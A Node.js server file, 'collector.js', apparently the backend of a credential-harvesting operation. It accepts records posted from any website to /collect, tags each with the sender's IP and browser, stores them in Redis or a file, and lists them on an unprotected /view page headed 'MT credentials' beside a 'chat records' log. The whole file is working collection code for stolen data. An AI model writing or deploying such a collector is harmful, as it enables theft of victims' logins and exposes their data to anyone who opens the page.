// language: javascript / file: collector.js / runtime: Node 18+, 仅依赖 redis ^4.6.0
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 10000;
const DATA_DIR = process.env.DATA_DIR || '/tmp';
const MT_FILE = path.join(DATA_DIR, 'MT');
const CHAT_LOG = path.join(DATA_DIR, 'chat.log');
const PUBLIC_DIR = path.join(__dirname, 'public');

const STATIC_ALLOW = new Set([
  '/', '/index.html', '/page.html',
  '/public/collector.js', '/public/page.html'
]);

function withTimeout(p, ms) {
  return Promise.race([
    p,
    new Promise(function (r) { setTimeout(function () { r(null); }, ms); })
  ]);
}

function readFileLines(p) {
  try { return fs.readFileSync(p, 'utf8').split('\n').filter(Boolean); }
  catch (e) { return []; }
}

function appendLine(p, line) {
  try {
    if (fs.existsSync(p) && fs.statSync(p).size > 5 * 1024 * 1024) fs.unlinkSync(p);
    fs.appendFileSync(p, line);
  } catch (e) {}
}

function send(res, code, body, type) {
  res.writeHead(code, {
    'Content-Type': type || 'text/plain; charset=utf-8',
    'Access-Control-Allow-Origin': '*'
  });
  res.end(body || '');
}

function serveStatic(res, urlPath) {
  if (!STATIC_ALLOW.has(urlPath)) return false;
  const rel = (urlPath === '/' || urlPath === '/index.html')
    ? 'index.html'
    : (urlPath.indexOf('/public/') === 0 ? urlPath.slice(8) : urlPath.slice(1));
  const file = path.join(PUBLIC_DIR, rel);
  if (file.indexOf(PUBLIC_DIR) !== 0) return false;
  try {
    const data = fs.readFileSync(file);
    const ext = path.extname(file);
    const type = ext === '.html' ? 'text/html; charset=utf-8'
      : ext === '.js' ? 'application/javascript; charset=utf-8'
      : 'text/plain; charset=utf-8';
    send(res, 200, data, type);
    return true;
  } catch (e) { return false; }
}

const store = {
  client: null,
  async init() {
    if (!process.env.RENDER_KV_URL) return;
    try {
      const { createClient } = require('redis');
      const raw = process.env.RENDER_KV_URL.trim();
      const useTls = /^rediss:/i.test(raw);
      this.client = createClient({
        url: useTls ? raw : raw.replace(/^redis:/i, 'rediss:'),
        socket: { connectTimeout: 5000, reconnectStrategy: false, tls: true }
      });
      this.client.on('error', function (e) { console.log('[kv] err:', e.message); });
      await this.client.connect();
      console.log('[kv] connected');
    } catch (e) {
      this.client = null;
      console.log('[kv] skip:', e.message);
    }
  },
  async save(rec) {
    const line = JSON.stringify(rec);
    if (this.client && this.client.isReady) {
      try { await this.client.rPush('MT', line); return; }
      catch (e) { console.log('[kv] save fallback:', e.message); }
    }
    appendLine(MT_FILE, line + '\n');
  },
  async saveChat(rec) {
    const line = JSON.stringify(rec);
    if (this.client && this.client.isReady) {
      try { await this.client.rPush('CHAT', line); return; }
      catch (e) { console.log('[kv] chat fallback:', e.message); }
    }
    appendLine(CHAT_LOG, line + '\n');
  },
  async list() {
    if (this.client && this.client.isReady) {
      try {
        const rows = await this.client.lRange('MT', 0, -1);
        return rows.map(function (r) { return JSON.parse(r); });
      } catch (e) { console.log('[kv] list fallback:', e.message); }
    }
    return readFileLines(MT_FILE).map(function (l) { return JSON.parse(l); });
  },
  async chat() {
    if (this.client && this.client.isReady) {
      try {
        const rows = await this.client.lRange('CHAT', 0, -1);
        return rows.map(function (r) { return JSON.parse(r); });
      } catch (e) { console.log('[kv] chat fallback:', e.message); }
    }
    return readFileLines(CHAT_LOG).map(function (l) { return JSON.parse(l); });
  }
};

const server = http.createServer(async function (req, res) {
  const u = new URL(req.url, 'http://localhost');
  const p = u.pathname;

  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    return res.end();
  }

  if (req.method === 'GET' && serveStatic(res, p)) return;

  if (p === '/collect' && req.method === 'POST') {
    let raw = '';
    req.on('data', function (c) { raw += c; });
    req.on('end', async function () {
      try {
        const rec = JSON.parse(raw);
        rec.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        rec.ua = req.headers['user-agent'] || '';
        rec.at = new Date().toISOString();
        await store.save(rec);
        if (rec && (rec.msg || rec.t === 'callback')) await store.saveChat(rec);
      } catch (e) {}
      send(res, 204);
    });
    return;
  }

  if (p === '/collect' && req.method === 'GET') {
    const rec = {};
    Object.keys(u.searchParams).forEach(function (k) { rec[k] = u.searchParams.get(k); });
    rec.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    rec.ua = req.headers['user-agent'] || '';
    rec.at = new Date().toISOString();
    await store.save(rec);
    if (rec.msg) await store.saveChat(rec);
    send(res, 204);
    return;
  }

  if (p === '/view') {
    const rows = await withTimeout(store.list(), 4000) || [];
    const logs = await withTimeout(store.chat(), 4000) || [];
    const esc = function (s) { return String(s).replace(/</g, '&lt;'); };
    const html = [
      '<!doctype html><html><head><meta charset="utf-8"><title>MT</title>',
      '<style>body{font:14px/1.6 monospace;padding:16px}table{border-collapse:collapse}',
      'td,th{border:1px solid #ccc;padding:4px 8px;vertical-align:top}th{background:#eee}',
      '</style></head><body><h3>MT 凭证</h3>',
      '<table><tr><th>时间</th><th>IP</th><th>数据</th></tr>',
      rows.map(function (r) {
        return '<tr><td>' + (r.at || '') + '</td><td>' + (r.ip || '') +
          '</td><td>' + esc(JSON.stringify(r)) + '</td></tr>';
      }).join(''),
      '</table><h3>聊天记录</h3><table><tr><th>时间</th><th>内容</th></tr>',
      logs.map(function (r) {
        return '<tr><td>' + (r.at || '') + '</td><td>' + esc(r.msg || '') + '</td></tr>';
      }).join(''),
      '</table></body></html>'
    ].join('');
    send(res, 200, html, 'text/html; charset=utf-8');
    return;
  }

  send(res, 404, 'not found');
});

store.init().then(function () {
  server.listen(PORT, function () { console.log('collector on :' + PORT); });
});
